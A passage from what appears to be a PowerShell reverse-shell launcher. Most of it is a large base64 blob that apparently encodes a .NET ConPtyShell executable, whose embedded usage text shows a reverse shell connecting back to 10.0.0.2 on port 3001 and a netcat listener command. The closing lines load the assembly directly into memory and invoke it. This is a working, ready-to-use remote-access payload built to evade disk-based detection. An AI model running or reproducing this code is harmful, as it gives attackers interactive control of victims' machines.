AG4AZAA6AA0ACgAgACAAIAAgAHMAdAB0AHkAIAByAGEAdwAgAC0AZQBjAGgAbwA7ACAAKABzAHQAdAB5ACAAcwBpAHoAZQA7ACAAYwBhAHQAKQAgAHwAIABuAGMAIAAtAGwAdgBuAHAAIAAzADAAMAAxAA0ACgANAAoASQBmACAAeQBvAHUAIAB3AGEAbgB0ACAAdABvACAAYwBoAGEAbgBnAGUAIAB0AGgAZQAgAGMAbwBuAHMAbwBsAGUAIABzAGkAegBlACAAZABpAHIAZQBjAHQAbAB5ACAAZgByAG8AbQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwADQAKAHkAbwB1ACAAYwBhAG4AIABwAGEAcwB0AGUAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAYwBvAG0AbQBhAG4AZABzADoADQAKACAAIAAgACAAJAB3AGkAZAB0AGgAPQA4ADAADQAKACAAIAAgACAAJABoAGUAaQBnAGgAdAA9ADIANAANAAoAIAAgACAAIAAkAEgAbwBzAHQALgBVAEkALgBSAGEAdwBVAEkALgBCAHUAZgBmAGUAcgBTAGkAegBlACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEgAbwBzAHQALgBTAGkAegBlACAAKAAkAHcAaQBkAHQAaAAsACAAJABoAGUAaQBnAGgAdAApAA0ACgAgACAAIAAgACQASABvAHMAdAAuAFUASQAuAFIAYQB3AFUASQAuAFcAaQBuAGQAbwB3AFMAaQB6AGUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEgAbwBzAHQALgBTAGkAegBlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACgAJAB3AGkAZAB0AGgALAAgACQAaABlAGkAZwBoAHQAKQANAAoADQAKAFUAcwBhAGcAZQA6AA0ACgAgACAAIAAgAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAGUAeABlACAAcgBlAG0AbwB0AGUAXwBpAHAAIAByAGUAbQBvAHQAZQBfAHAAbwByAHQAIABbAHIAbwB3AHMAXQAgAFsAYwBvAGwAcwBdACAAWwBjAG8AbQBtAGEAbgBkAGwAaQBuAGUAXQANAAoADQAKAFAAbwBzAGkAdABpAG8AbgBhAGwAIABhAHIAZwB1AG0AZQBuAHQAcwA6AA0ACgAgACAAIAAgAHIAZQBtAG8AdABlAF8AaQBwACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFQAaABlACAAcgBlAG0AbwB0AGUAIABpAHAAIAB0AG8AIABjAG8AbgBuAGUAYwB0AA0ACgAgACAAIAAgAHIAZQBtAG8AdABlAF8AcABvAHIAdAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFQAaABlACAAcgBlAG0AbwB0AGUAIABwAG8AcgB0ACAAdABvACAAYwBvAG4AbgBlAGMAdAANAAoAIAAgACAAIABbAHIAbwB3AHMAXQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAG8AdwBzACAAcwBpAHoAZQAgAGYAbwByACAAdABoAGUAIABjAG8AbgBzAG8AbABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQAZQBmAGEAdQBsAHQAOgAgACIAMgA0ACIADQAKACAAIAAgACAAWwBjAG8AbABzAF0AIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAGwAcwAgAHMAaQB6AGUAIABmAG8AcgAgAHQAaABlACAAYwBvAG4AcwBvAGwAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAGUAZgBhAHUAbAB0ADoAIAAiADgAMAAiAA0ACgAgACAAIAAgAFsAYwBvAG0AbQBhAG4AZABsAGkAbgBlAF0AIAAgACAAIAAgACAAIAAgACAAIAAgAFQAaABlACAAYwBvAG0AbQBhAG4AZABsAGkAbgBlACAAbwBmACAAdABoAGUAIABwAHIAbwBjAGUAcwBzACAAdABoAGEAdAAgAHkAbwB1ACAAYQByAGUAIABnAG8AaQBuAGcAIAB0AG8AIABpAG4AdABlAHIAYQBjAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABlAGYAYQB1AGwAdAA6ACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoARQB4AGEAbQBwAGwAZQBzADoADQAKACAAIAAgACAAUwBwAGEAdwBuACAAYQAgAHIAZQB2AGUAcgBzAGUAIABzAGgAZQBsAGwADQAKACAAIAAgACAAIAAgACAAIABDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBlAHgAZQAgADEAMAAuADAALgAwAC4AMgAgADMAMAAwADEADQAKACAAIAAgACAADQAKACAAIAAgACAAUwBwAGEAdwBuACAAYQAgAHIAZQB2AGUAcgBzAGUAIABzAGgAZQBsAGwAIAB3AGkAdABoACAAcwBwAGUAYwBpAGYAaQBjACAAcgBvAHcAcwAgAGEAbgBkACAAYwBvAGwAcwAgAHMAaQB6AGUADQAKACAAIAAgACAAIAAgACAAIABDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBlAHgAZQAgADEAMAAuADAALgAwAC4AMgAgADMAMAAwADEAIAAzADAAIAA5ADAADQAKACAAIAAgACAADQAKACAAIAAgACAAUwBwAGEAdwBuACAAYQAgAHIAZQB2AGUAcgBzAGUAIABzAGgAZQBsAGwAIAAoAGMAbQBkAC4AZQB4AGUAKQAgAHcAaQB0AGgAIABzAHAAZQBjAGkAZgBpAGMAIAByAG8AdwBzACAAYQBuAGQAIABjAG8AbABzACAAcwBpAHoAZQANAAoAIAAgACAAIAAgACAAIAAgAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAGUAeABlACAAMQAwAC4AMAAuADAALgAyACAAMwAwADAAMQAgADMAMAAgADkAMAAgAGMAbQBkAC4AZQB4AGUADQAKAA0ACgABva07tOxyxUivI8Po8o4jxwAIt3pcVhk04IkCBg44ewB7AHsAQwBvAG4AUAB0AHkAUwBoAGUAbABsAEUAeABjAGUAcAB0AGkAbwBuAH0AfQB9AA0ACgACBgkEBAAAAAQIAAAABBYAAgAEAAAIAAT/////AgYIBAAAAAAEAAAAgAQAAABABAEAAAAEAgAAAASAAAAABAMAAAAE9v///wT1////BPT///8IAAQCGAgIEBgKAAcCGAkYGBgYGBUACgIODhARGBARGAIJGA4QEQwQERQFAAICGAkFAAIJGAkFAAICCBgEAAEYCAQAAQIYCQAEAhAYEBgYCAoABxgOCQkYCQkYCgAFAhgdBQkQCRgKAAUIERwYGAkQGAQAAQgYBgACAhgQCQMAAAIFAAICGAgDAAAYBgACEg0OCAkAAwESDRAJEAkDAAABCwAFCBAYEBgQGAkJBgACEQwYGAgAAhEUEBEMDgYAAhEUGA4EAAEBHAcAAhIRGBINCAADEhEYEg0YCAAFDg4ICQkOAwYREAIGGAIGBgQAAQIOBQABAR0OBAABDg4EAAEIDgUAAQkdDgUAAQ4dDgMgAAEFIAEBERkBAgQgAQEIBCABAQ4FAAESMQ4GIAIBEjEIBCAAET0JIAMBET0RQRFFBSABARI5AyAAAgQAABJJBSABHQUOBSABCB0FDAcFEg0SMRI1Eg0dBQQAAQEIAyAACAcgAw4dBQgIBiABHQ4dAwMgAA4GAAICDhAIDgcJHQUICAgODg4dAx0DBAcCGBgEBwIJGAcHBAgYGBEcBQACAhgYAwAACAUAAg4cHAQQAQAIBAoBEQwEAAEYGAYHAxgCEQwECgERGA4HBxEUCBEYERgCERgRGAQAARgKBgcCEQwRFAIdHAggAwgdBQgRaQwHBx0cGBINHQUCCAkFIAIBHBgFIAEBEm0EIAEBHAYHAh0cEhENBwgdHBgSDRgdBQIICQcABA4OHBwcBQACDg4OBgADDg4cHAUgAQERcQ8HCQ4SDRgYGAgRFBIREhEFIAEBEXkFAAICDg4FAAASgIEHAAICDhASMQUgAgEOHAQHARIxAwcBCAMHAQkDBwEOCAcGDg4ICQkOCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzASBXAAAAAAAAAAAAAD5XAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwVwAAAAAAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAAA4AACAAAAAAAAAAAAAAAAAAAABAAEAAABQAACAAAAAAAAAAAAAAAAAAAABAAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAABAAAAAACQAAAAoGAAAFQCAAAAAAAAAAAAAPhiAADqAQAAAAAAAAAAAABUAjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAAPwAAAAAAAAAEAAAAAQAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEtAEAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAkAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADAALgAwAC4AMAAuADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAGUAeABlAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEgAEAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBlAHgAZQAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCIgc3RhbmRhbG9uZT0ieWVzIj8+DQo8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBwbGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9ImFzSW52b2tlciIgdWlBY2Nlc3M9ImZhbHNlIi8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAAAMAAAAUDcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    $ConPtyShellBytes = [System.Convert]::FromBase64String($ConPtyShellBase64)
    [Reflection.Assembly]::Load($ConPtyShellBytes) | Out-Null
    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
    Write-Output $output
}
